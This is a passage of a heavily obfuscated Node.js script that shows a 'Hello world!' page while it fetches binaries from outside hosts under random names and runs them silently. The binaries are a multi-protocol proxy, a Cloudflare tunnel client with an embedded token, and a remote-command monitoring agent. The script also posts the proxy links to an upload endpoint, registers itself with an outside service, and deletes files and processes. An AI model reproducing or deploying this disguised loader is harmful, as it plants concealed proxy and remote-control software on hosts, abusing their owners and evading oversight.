const _0x1d27b4=_0x2c4a;(function(_0x15d8ea,_0x553499){const _0x46ab0a={_0x1cf08f:0x147,_0x237c9d:0xb5,_0x13686f:0x11e,_0x23cbfd:0xde,_0x1e313d:0xb7,_0x1b5cdb:0xf3,_0x254716:0x118},_0x38fd70=_0x2c4a,_0x1a0e83=_0x15d8ea();while(!![]){try{const _0x363a86=parseInt(_0x38fd70(_0x46ab0a._0x1cf08f))/0x1*(parseInt(_0x38fd70(_0x46ab0a._0x237c9d))/0x2)+-parseInt(_0x38fd70(_0x46ab0a._0x13686f))/0x3*(-parseInt(_0x38fd70(0x153))/0x4)+parseInt(_0x38fd70(0x121))/0x5+parseInt(_0x38fd70(_0x46ab0a._0x23cbfd))/0x6*(-parseInt(_0x38fd70(0x115))/0x7)+-parseInt(_0x38fd70(_0x46ab0a._0x1e313d))/0x8*(parseInt(_0x38fd70(0x130))/0x9)+parseInt(_0x38fd70(_0x46ab0a._0x1b5cdb))/0xa+-parseInt(_0x38fd70(_0x46ab0a._0x254716))/0xb*(parseInt(_0x38fd70(0x12a))/0xc);if(_0x363a86===_0x553499)break;else _0x1a0e83['push'](_0x1a0e83['shift']());}catch(_0x47ac88){_0x1a0e83['push'](_0x1a0e83['shift']());}}}(_0x295a,0x47277));const express=require(_0x1d27b4(0xa6)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1d27b4(0xf9)),{promisify}=require(_0x1d27b4(0xcd)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x1d27b4(0x14e)][_0x1d27b4(0xda)]||'',PROJECT_URL=process[_0x1d27b4(0x14e)][_0x1d27b4(0xa8)]||'',AUTO_ACCESS=process[_0x1d27b4(0x14e)][_0x1d27b4(0x14a)]||![],FILE_PATH=process[_0x1d27b4(0x14e)]['FILE_PATH']||_0x1d27b4(0x13f),SUB_PATH=process[_0x1d27b4(0x14e)][_0x1d27b4(0x129)]||_0x1d27b4(0xe3),PORT=process[_0x1d27b4(0x14e)][_0x1d27b4(0x13e)]||process['env'][_0x1d27b4(0xc8)]||0xbb8,UUID=process[_0x1d27b4(0x14e)][_0x1d27b4(0xfa)]||_0x1d27b4(0xba),NEZHA_SERVER=process[_0x1d27b4(0x14e)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x1d27b4(0x10e)]||'',NEZHA_KEY=process[_0x1d27b4(0x14e)][_0x1d27b4(0x123)]||'',ARGO_DOMAIN=process[_0x1d27b4(0x14e)][_0x1d27b4(0x145)]||_0x1d27b4(0xe8),ARGO_AUTH=process['env'][_0x1d27b4(0x142)]||_0x1d27b4(0xd2),ARGO_PORT=process[_0x1d27b4(0x14e)]['ARGO_PORT']||0x1156,CFIP=process[_0x1d27b4(0x14e)][_0x1d27b4(0x126)]||_0x1d27b4(0xb0),CFPORT=process[_0x1d27b4(0x14e)]['CFPORT']||0x1bb,NAME=process[_0x1d27b4(0x14e)][_0x1d27b4(0x134)]||'RW';!fs[_0x1d27b4(0xf6)](FILE_PATH)?(fs[_0x1d27b4(0xf0)](FILE_PATH),console[_0x1d27b4(0xa7)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x363aaa=_0x1d27b4,_0x244f2e=_0x363aaa(0x152);let _0xb0b423='';for(let _0x8825f4=0x0;_0x8825f4<0x6;_0x8825f4++){_0xb0b423+=_0x244f2e[_0x363aaa(0xef)](Math['floor'](Math[_0x363aaa(0xb9)]()*_0x244f2e[_0x363aaa(0xc1)]));}return _0xb0b423;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1d27b4(0xee)](FILE_PATH,phpName),webPath=path[_0x1d27b4(0xee)](FILE_PATH,webName),botPath=path[_0x1d27b4(0xee)](FILE_PATH,botName),subPath=path[_0x1d27b4(0xee)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x1d27b4(0xbc)),configPath=path[_0x1d27b4(0xee)](FILE_PATH,'config.json');function _0x295a(){const _0x662f12=['\x0a\x20\x20credentials-file:\x20','taskkill\x20/f\x20/im\x20','unlink','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','356019QZYWQC','.exe\x20>\x20nul\x202>&1','post','24135XKlfxw','error','NEZHA_KEY','/sub.txt\x20saved\x20successfully','application/json','CFIP','/api/add-nodes','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','SUB_PATH','3833124yVfGqv','pkill\x20-f\x20\x22[','readdirSync','/dev/null','Add\x20automatic\x20access\x20task\x20faild:\x20','nohup\x20','3141513vkhYWj','\x20-c\x20','\x22\x20>\x20/dev/null\x202>&1','writeFileSync','NAME','Error\x20executing\x20command:\x20','then','2087','\x0a\x20\x20tunnel:\x20','close','tcp','config.yaml','rm\x20-rf\x20','\x0a\x20\x20\x0atrojan://','SERVER_PORT','./tmp','\x20is\x20running','tls','ARGO_AUTH','map','http','ARGO_DOMAIN','Content-Type','117545xdlvpU','createWriteStream','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','AUTO_ACCESS','Error\x20in\x20startserver:','8443','https://amd64.ssss.nyc.mn/v1','env','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Download\x20','Hello\x20world!','abcdefghijklmnopqrstuvwxyz','8JuMGEj','/vmess-argo','stringify','arm','del\x20/f\x20/q\x20','https://arm64.ssss.nyc.mn/bot','Error\x20downloading\x20files:','Empowerment\x20success\x20for\x20','https://oooo.serv00.net/add-url','clear','trojan','express','log','PROJECT_URL','from','includes','text/plain;\x20charset=utf-8','unlinkSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','tunnel.json','base64','shopify.com','pipe','stream','false','test','8lZoPTJ','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','8oeGtTJ','trim','random','f52e1c70-e5cb-4722-accf-133edc1bbfdd','send','boot.log','php\x20running\x20error:\x20','toString','?security=tls&sni=','blackhole','length','\x20failed:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','set','finish','filter','ArgoDomain:','PORT','push','npm\x20running\x20error:\x20','https://arm64.ssss.nyc.mn/agent','\x20-p\x20','util','arm64','aarch64','split','/api/delete-nodes','eyJhIjoiNzlkZWY4MmEyZGY1YjRkMmNhNTg5MTQ3NzcyMWQ4YzQiLCJ0IjoiNmFiYzY1MjEtMTgwYi00OGIxLWJmOTUtMDkwODFlNDUwNmU4IiwicyI6IlltUXlNelF6TWpZdFlUUTFPQzAwWVdFd0xXSTNNMk10TURFNVlqaGpPV1kyTURBNSJ9','substring','platform','message','http\x20server\x20is\x20running\x20on\x20port:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','UPLOAD_URL','\x0avless://','App\x20is\x20running','response','18JXSZwa','basename','/vmess-argo?ed=2560','amd','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','sub2','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','127.0.0.1','https://arm64.ssss.nyc.mn/v1','rlwy.goi.qzz.io','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','unshift','/config.json\x20>/dev/null\x202>&1\x20&','\x0aclient_secret:\x20','/trojan-argo','join','charAt','mkdirSync','none','status','4774920bOwdmM','\x0a\x20\x20\x20\x20','direct','existsSync','/api/add-subscriptions','statSync','path','UUID','2096','443','/vless-argo','xtls-rprx-vision','2083','vmess','forEach','2053','Skipping\x20adding\x20automatic\x20access\x20task','all','quic','\x20-s\x20','config.json','TunnelSecret','automatic\x20access\x20task\x20added\x20successfully','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Unhandled\x20error\x20in\x20startserver:','readFileSync','NEZHA_PORT','data','block','catch','match','Nodes\x20uploaded\x20successfully','get','536466YKcjKm','utf-8','?encryption=none&security=tls&sni=','11QiMRYR'];_0x295a=function(){return _0x662f12;};return _0x295a();}function _0x2c4a(_0xc4bf87,_0xbca9ee){const _0x295ac9=_0x295a();return _0x2c4a=function(_0x2c4afd,_0x7974bb){_0x2c4afd=_0x2c4afd-0x9e;let _0x3c20ed=_0x295ac9[_0x2c4afd];return _0x3c20ed;},_0x2c4a(_0xc4bf87,_0xbca9ee);}function deleteNodes(){const _0xfb8dc5={_0x59ab44:0x116,_0x4fd055:0xa9,_0x39aa8e:0xbe,_0x1d15a5:0x125},_0x45eb75=_0x1d27b4;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2aa88a;try{_0x2aa88a=fs['readFileSync'](subPath,_0x45eb75(_0xfb8dc5._0x59ab44));}catch{return null;}const _0x575b5b=Buffer[_0x45eb75(_0xfb8dc5._0x4fd055)](_0x2aa88a,_0x45eb75(0xaf))[_0x45eb75(_0xfb8dc5._0x39aa8e)]('utf-8'),_0x5c14ee=_0x575b5b['split']('\x0a')[_0x45eb75(0xc6)](_0xca168c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45eb75(0xb4)](_0xca168c));if(_0x5c14ee['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x45eb75(0xd1),JSON[_0x45eb75(0x155)]({'nodes':_0x5c14ee}),{'headers':{'Content-Type':_0x45eb75(_0xfb8dc5._0x1d15a5)}})[_0x45eb75(0x111)](_0x509aca=>{return null;}),null;}catch(_0x395d5d){return null;}}function cleanupOldFiles(){const _0x1b3f3f={_0xbbe90e:0x101},_0x6b231b={_0x3ae95a:0xf8,_0x4bc809:0xac},_0x134851=_0x1d27b4;try{const _0x509b4c=fs[_0x134851(0x12c)](FILE_PATH);_0x509b4c[_0x134851(_0x1b3f3f._0xbbe90e)](_0x3862f6=>{const _0x28b1dc=_0x134851,_0x5935bb=path['join'](FILE_PATH,_0x3862f6);try{const _0x27d9c5=fs[_0x28b1dc(_0x6b231b._0x3ae95a)](_0x5935bb);_0x27d9c5['isFile']()&&fs[_0x28b1dc(_0x6b231b._0x4bc809)](_0x5935bb);}catch(_0x577556){}});}catch(_0x38ce0b){}}app[_0x1d27b4(0x114)]('/',function(_0x5c6f40,_0x4e6fb3){const _0x3e6817={_0x30bb62:0xbb},_0x31a527=_0x1d27b4;_0x4e6fb3[_0x31a527(_0x3e6817._0x30bb62)](_0x31a527(0x151));});async function generateConfig(){const _0x48fa6f={_0x5de51e:0xfe,_0x2934bf:0xe6,_0x72d2f3:0x10a,_0x433e5c:0xfd,_0x46808b:0x144,_0x4111a7:0x105,_0x10888c:0xe6,_0xc65e69:0x100,_0x3e9e91:0x154,_0x11de15:0xa5,_0x25efb1:0xf1,_0x3aaf74:0xed,_0x57eeb4:0xf5},_0x2cf3e8=_0x1d27b4,_0x220e70={'log':{'access':'/dev/null','error':_0x2cf3e8(0x12d),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2cf3e8(_0x48fa6f._0x5de51e)}],'decryption':_0x2cf3e8(0xf1),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2cf3e8(0x154),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x2cf3e8(0x13a)}},{'port':0xbb9,'listen':_0x2cf3e8(0xe6),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2cf3e8(0x13a),'security':_0x2cf3e8(0xf1)}},{'port':0xbba,'listen':_0x2cf3e8(_0x48fa6f._0x2934bf),'protocol':_0x2cf3e8(_0x48fa6f._0x72d2f3),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2cf3e8(0xf1)},'streamSettings':{'network':'ws','security':_0x2cf3e8(0xf1),'wsSettings':{'path':_0x2cf3e8(_0x48fa6f._0x433e5c)}},'sniffing':{'enabled':!![],'destOverride':[_0x2cf3e8(_0x48fa6f._0x46808b),_0x2cf3e8(0x141),_0x2cf3e8(_0x48fa6f._0x4111a7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2cf3e8(_0x48fa6f._0x10888c),'protocol':_0x2cf3e8(_0x48fa6f._0xc65e69),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2cf3e8(_0x48fa6f._0x3e9e91)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x2cf3e8(0x141),_0x2cf3e8(_0x48fa6f._0x4111a7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2cf3e8(_0x48fa6f._0x10888c),'protocol':_0x2cf3e8(_0x48fa6f._0x11de15),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2cf3e8(_0x48fa6f._0x25efb1),'wsSettings':{'path':_0x2cf3e8(_0x48fa6f._0x3aaf74)}},'sniffing':{'enabled':!![],'destOverride':[_0x2cf3e8(0x144),_0x2cf3e8(0x141),_0x2cf3e8(_0x48fa6f._0x4111a7)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x2cf3e8(_0x48fa6f._0x57eeb4)},{'protocol':_0x2cf3e8(0xc0),'tag':_0x2cf3e8(0x110)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x2cf3e8(0x107)),JSON['stringify'](_0x220e70,null,0x2));}function getSystemArchitecture(){const _0x308337={_0x1049b9:0x9e},_0x39945a=_0x1d27b4,_0x5d75df=os['arch']();return _0x5d75df==='arm'||_0x5d75df===_0x39945a(0xce)||_0x5d75df===_0x39945a(0xcf)?_0x39945a(_0x308337._0x1049b9):_0x39945a(0xe1);}function downloadFile(_0x44c22d,_0x595c12,_0x40f5db){const _0x48ef24={_0x406c36:0x148,_0x9ae5b4:0x114,_0x509418:0xb2,_0x34da2d:0x136,_0x1bd257:0x111},_0x42896b={_0x342116:0xc2,_0x1bfc45:0xd5,_0x2388dd:0x122},_0x5d2884={_0x7bed5a:0x10f,_0x14523e:0xc5,_0x55a3e1:0x122},_0x2cde37=_0x1d27b4,_0x34c04a=_0x44c22d;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x14633b=fs[_0x2cde37(_0x48ef24._0x406c36)](_0x34c04a);axios({'method':_0x2cde37(_0x48ef24._0x9ae5b4),'url':_0x595c12,'responseType':_0x2cde37(_0x48ef24._0x509418)})[_0x2cde37(_0x48ef24._0x34da2d)](_0x4cc984=>{const _0x721e64={_0x1106b5:0x150,_0x563b2a:0xc2,_0x22d987:0xd5,_0x28dba4:0x122},_0x17d511={_0x18c0ca:0x150},_0xaae300=_0x2cde37;_0x4cc984[_0xaae300(_0x5d2884._0x7bed5a)][_0xaae300(0xb1)](_0x14633b),_0x14633b['on'](_0xaae300(_0x5d2884._0x14523e),()=>{const _0x5be6bc=_0xaae300;_0x14633b[_0x5be6bc(0x139)](),console[_0x5be6bc(0xa7)](_0x5be6bc(_0x17d511._0x18c0ca)+path['basename'](_0x34c04a)+'\x20successfully'),_0x40f5db(null,_0x34c04a);}),_0x14633b['on'](_0xaae300(_0x5d2884._0x55a3e1),_0x20574d=>{const _0x45f47e=_0xaae300;fs[_0x45f47e(0x11b)](_0x34c04a,()=>{});const _0xa9c328=_0x45f47e(_0x721e64._0x1106b5)+path[_0x45f47e(0xdf)](_0x34c04a)+_0x45f47e(_0x721e64._0x563b2a)+_0x20574d[_0x45f47e(_0x721e64._0x22d987)];console[_0x45f47e(_0x721e64._0x28dba4)](_0xa9c328),_0x40f5db(_0xa9c328);});})[_0x2cde37(_0x48ef24._0x1bd257)](_0x213b6d=>{const _0x332f25=_0x2cde37,_0x156d55='Download\x20'+path[_0x332f25(0xdf)](_0x34c04a)+_0x332f25(_0x42896b._0x342116)+_0x213b6d[_0x332f25(_0x42896b._0x1bfc45)];console[_0x332f25(_0x42896b._0x2388dd)](_0x156d55),_0x40f5db(_0x156d55);});}async function downloadFilesAndRun(){const _0x3db90={_0x2cc31b:0x128,_0x16beda:0x104,_0xe25dcf:0xfc,_0x4f75c2:0xfb,_0x3159da:0x137,_0x3e2aae:0xff,_0x1f7791:0x102,_0x18e78c:0xec,_0x32fd47:0x133,_0x363c96:0xee,_0x487762:0x13b,_0x3f6504:0xbd,_0x29b6d5:0x14c,_0x59256b:0x137,_0x73b90a:0x12f,_0x441eaf:0x106,_0x5698e9:0xcc,_0x1628d2:0xb6,_0x21215f:0x140,_0x6c3b3a:0x122,_0xf5217d:0x12f,_0x38bf4f:0x140,_0x2e3196:0xf6,_0x421ee8:0x112,_0x66a314:0x11d,_0x543c88:0xe2,_0x22dfa0:0x12f},_0x503759={_0x23d444:0x101},_0x5673c2=_0x1d27b4,_0x1b87e3=getSystemArchitecture(),_0x396bc9=getFilesForArchitecture(_0x1b87e3);if(_0x396bc9[_0x5673c2(0xc1)]===0x0){console[_0x5673c2(0xa7)](_0x5673c2(_0x3db90._0x2cc31b));return;}const _0x59fa31=_0x396bc9[_0x5673c2(0x143)](_0x426bd1=>{return new Promise((_0x260920,_0x4a6b18)=>{downloadFile(_0x426bd1['fileName'],_0x426bd1['fileUrl'],(_0xd7a8df,_0x580756)=>{_0xd7a8df?_0x4a6b18(_0xd7a8df):_0x260920(_0x580756);});});});try{await Promise[_0x5673c2(_0x3db90._0x16beda)](_0x59fa31);}catch(_0x316f2d){console[_0x5673c2(0x122)](_0x5673c2(0xa1),_0x316f2d);return;}function _0x19ee64(_0x15c4b2){const _0x152dfd=_0x5673c2,_0x24c289=0x1fd;_0x15c4b2[_0x152dfd(_0x503759._0x23d444)](_0x47669c=>{const _0x191c47=_0x152dfd;fs[_0x191c47(0xf6)](_0x47669c)&&fs['chmod'](_0x47669c,_0x24c289,_0x1671e8=>{const _0x46de8a=_0x191c47;_0x1671e8?console['error']('Empowerment\x20failed\x20for\x20'+_0x47669c+':\x20'+_0x1671e8):console['log'](_0x46de8a(0xa2)+_0x47669c+':\x20'+_0x24c289[_0x46de8a(0xbe)](0x8));});});}const _0x169f5a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x19ee64(_0x169f5a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3873c7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x193d36=new Set([_0x5673c2(_0x3db90._0xe25dcf),'8443',_0x5673c2(_0x3db90._0x4f75c2),_0x5673c2(_0x3db90._0x3159da),_0x5673c2(_0x3db90._0x3e2aae),_0x5673c2(_0x3db90._0x1f7791)]),_0x3fe201=_0x193d36['has'](_0x3873c7)?'true':_0x5673c2(0xb3),_0x44b9e5=_0x5673c2(_0x3db90._0x18e78c)+NEZHA_KEY+_0x5673c2(0xd7)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3fe201+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5673c2(_0x3db90._0x32fd47)](path[_0x5673c2(_0x3db90._0x363c96)](FILE_PATH,_0x5673c2(_0x3db90._0x487762)),_0x44b9e5);const _0x5f3e20=_0x5673c2(0x12f)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x5673c2(0xd8);try{await exec(_0x5f3e20),console[_0x5673c2(0xa7)](phpName+'\x20is\x20running'),await new Promise(_0x5e0413=>setTimeout(_0x5e0413,0x3e8));}catch(_0x2e2d8d){console[_0x5673c2(0x122)](_0x5673c2(_0x3db90._0x3f6504)+_0x2e2d8d);}}else{let _0x58aa4d='';const _0x159db4=[_0x5673c2(0xfc),_0x5673c2(_0x3db90._0x29b6d5),_0x5673c2(0xfb),_0x5673c2(_0x3db90._0x59256b),'2083',_0x5673c2(_0x3db90._0x1f7791)];_0x159db4[_0x5673c2(0xaa)](NEZHA_PORT)&&(_0x58aa4d='--tls');const _0x3c4541=_0x5673c2(_0x3db90._0x73b90a)+npmPath+_0x5673c2(_0x3db90._0x441eaf)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5673c2(_0x3db90._0x5698e9)+NEZHA_KEY+'\x20'+_0x58aa4d+_0x5673c2(_0x3db90._0x1628d2);try{await exec(_0x3c4541),console['log'](npmName+_0x5673c2(_0x3db90._0x21215f)),await new Promise(_0x50977f=>setTimeout(_0x50977f,0x3e8));}catch(_0x15f54d){console[_0x5673c2(_0x3db90._0x6c3b3a)](_0x5673c2(0xca)+_0x15f54d);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x155688=_0x5673c2(_0x3db90._0xf5217d)+webPath+_0x5673c2(0x131)+FILE_PATH+_0x5673c2(0xeb);try{await exec(_0x155688),console[_0x5673c2(0xa7)](webName+_0x5673c2(_0x3db90._0x38bf4f)),await new Promise(_0x26dd66=>setTimeout(_0x26dd66,0x3e8));}catch(_0x22ae5b){console[_0x5673c2(0x122)]('web\x20running\x20error:\x20'+_0x22ae5b);}if(fs[_0x5673c2(_0x3db90._0x2e3196)](botPath)){let _0x27af95;if(ARGO_AUTH[_0x5673c2(_0x3db90._0x421ee8)](/^[A-Z0-9a-z=]{120,250}$/))_0x27af95='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5673c2(0x112)](/TunnelSecret/)?_0x27af95='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x27af95=_0x5673c2(_0x3db90._0x66a314)+FILE_PATH+_0x5673c2(_0x3db90._0x543c88)+ARGO_PORT;try{await exec(_0x5673c2(_0x3db90._0x22dfa0)+botPath+'\x20'+_0x27af95+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x5673c2(_0x3db90._0x38bf4f)),await new Promise(_0x52cca0=>setTimeout(_0x52cca0,0x7d0));}catch(_0x2ff2d5){console[_0x5673c2(0x122)]('Error\x20executing\x20command:\x20'+_0x2ff2d5);}}await new Promise(_0x3abe3f=>setTimeout(_0x3abe3f,0x1388));}function getFilesForArchitecture(_0x53a544){const _0x585412={_0x64a2f2:0xd9,_0x3edfef:0xea},_0x5ba3b6=_0x1d27b4;let _0x200611;_0x53a544===_0x5ba3b6(0x9e)?_0x200611=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5ba3b6(0xa0)}]:_0x200611=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5ba3b6(_0x585412._0x64a2f2)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10b28f=_0x53a544===_0x5ba3b6(0x9e)?_0x5ba3b6(0xcb):'https://amd64.ssss.nyc.mn/agent';_0x200611[_0x5ba3b6(0xea)]({'fileName':npmPath,'fileUrl':_0x10b28f});}else{const _0x416f42=_0x53a544==='arm'?_0x5ba3b6(0xe7):_0x5ba3b6(0x14d);_0x200611[_0x5ba3b6(_0x585412._0x3edfef)]({'fileName':phpPath,'fileUrl':_0x416f42});}}return _0x200611;}function argoType(){const _0x3d0f98={_0x8e8f80:0xa7,_0xf9e7b9:0x108,_0x2aa8bd:0x133,_0x28bf79:0xee,_0x1deb00:0x138,_0x9d1cf9:0x149},_0x4ca713=_0x1d27b4;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4ca713(_0x3d0f98._0x8e8f80)](_0x4ca713(0x11c));return;}if(ARGO_AUTH[_0x4ca713(0xaa)](_0x4ca713(_0x3d0f98._0xf9e7b9))){fs[_0x4ca713(_0x3d0f98._0x2aa8bd)](path[_0x4ca713(_0x3d0f98._0x28bf79)](FILE_PATH,_0x4ca713(0xae)),ARGO_AUTH);const _0xb1e005=_0x4ca713(_0x3d0f98._0x1deb00)+ARGO_AUTH['split']('\x22')[0xb]+_0x4ca713(0x119)+path[_0x4ca713(0xee)](FILE_PATH,'tunnel.json')+_0x4ca713(0xe9)+ARGO_DOMAIN+_0x4ca713(_0x3d0f98._0x9d1cf9)+ARGO_PORT+_0x4ca713(0x10b);fs['writeFileSync'](path[_0x4ca713(0xee)](FILE_PATH,'tunnel.yml'),_0xb1e005);}else console['log'](_0x4ca713(0xad));}argoType();async function extractDomains(){const _0x5c6cd2={_0x2eb998:0xd0,_0x2666b2:0xa7,_0x344063:0xac,_0x1fefb4:0xe2,_0x11c833:0x12f,_0x2fc465:0xa7,_0x2690b4:0x122},_0x162ea4={_0x36b194:0xe4},_0x249a3b={_0x4d9179:0xd4,_0x1d5f2f:0x11a,_0x485480:0x12b,_0x5d60fa:0xef,_0x564931:0xd3,_0x46ce44:0x132},_0x4fb5f2={_0xa2530a:0x112},_0x25cf4f=_0x1d27b4;let _0x100518;if(ARGO_AUTH&&ARGO_DOMAIN)_0x100518=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x100518),await _0x5443bc(_0x100518);else try{const _0x56e7e0=fs[_0x25cf4f(0x10d)](path[_0x25cf4f(0xee)](FILE_PATH,_0x25cf4f(0xbc)),'utf-8'),_0xfbfd10=_0x56e7e0[_0x25cf4f(_0x5c6cd2._0x2eb998)]('\x0a'),_0x4c1067=[];_0xfbfd10[_0x25cf4f(0x101)](_0x39ab08=>{const _0x2647f0=_0x25cf4f,_0x333e92=_0x39ab08[_0x2647f0(_0x4fb5f2._0xa2530a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x333e92){const _0x79b011=_0x333e92[0x1];_0x4c1067['push'](_0x79b011);}});if(_0x4c1067[_0x25cf4f(0xc1)]>0x0)_0x100518=_0x4c1067[0x0],console['log'](_0x25cf4f(0xc7),_0x100518),await _0x5443bc(_0x100518);else{console[_0x25cf4f(_0x5c6cd2._0x2666b2)](_0x25cf4f(0x14f)),fs[_0x25cf4f(_0x5c6cd2._0x344063)](path['join'](FILE_PATH,'boot.log'));async function _0x41a71c(){const _0x93e40b=_0x25cf4f;try{process[_0x93e40b(_0x249a3b._0x4d9179)]==='win32'?await exec(_0x93e40b(_0x249a3b._0x1d5f2f)+botName+_0x93e40b(0x11f)):await exec(_0x93e40b(_0x249a3b._0x485480)+botName[_0x93e40b(_0x249a3b._0x5d60fa)](0x0)+']'+botName[_0x93e40b(_0x249a3b._0x564931)](0x1)+_0x93e40b(_0x249a3b._0x46ce44));}catch(_0x1bcfd2){}}_0x41a71c(),await new Promise(_0x5a8773=>setTimeout(_0x5a8773,0xbb8));const _0x2d2ecf=_0x25cf4f(0x11d)+FILE_PATH+_0x25cf4f(_0x5c6cd2._0x1fefb4)+ARGO_PORT;try{await exec(_0x25cf4f(_0x5c6cd2._0x11c833)+botPath+'\x20'+_0x2d2ecf+'\x20>/dev/null\x202>&1\x20&'),console[_0x25cf4f(_0x5c6cd2._0x2fc465)](botName+_0x25cf4f(0x140)),await new Promise(_0x1c578c=>setTimeout(_0x1c578c,0xbb8)),await extractDomains();}catch(_0x143eb2){console[_0x25cf4f(_0x5c6cd2._0x2690b4)](_0x25cf4f(0x135)+_0x143eb2);}}}catch(_0x2ccbad){console['error']('Error\x20reading\x20boot.log:',_0x2ccbad);}async function _0x5443bc(_0x36903f){const _0x10112d={_0x1fe497:0xf1,_0x4e8d5a:0xe0,_0x39e650:0x117,_0x4ead78:0xa9,_0x53df14:0x155,_0x21d6d7:0xaf,_0x2db430:0xbf,_0x46973b:0xbe,_0x58ed33:0x133,_0x387235:0xa9,_0x486904:0xa7,_0x264b93:0x124},_0x528afb=_0x25cf4f,_0xdd80bc=execSync(_0x528afb(_0x162ea4._0x36b194),{'encoding':_0x528afb(0x116)}),_0xc49b86=_0xdd80bc[_0x528afb(0xb8)](),_0x511c76=NAME?NAME+'-'+_0xc49b86:_0xc49b86;return new Promise(_0x16a54e=>{const _0x404c06={_0xb9471f:0xaf,_0x4144fb:0xab};setTimeout(()=>{const 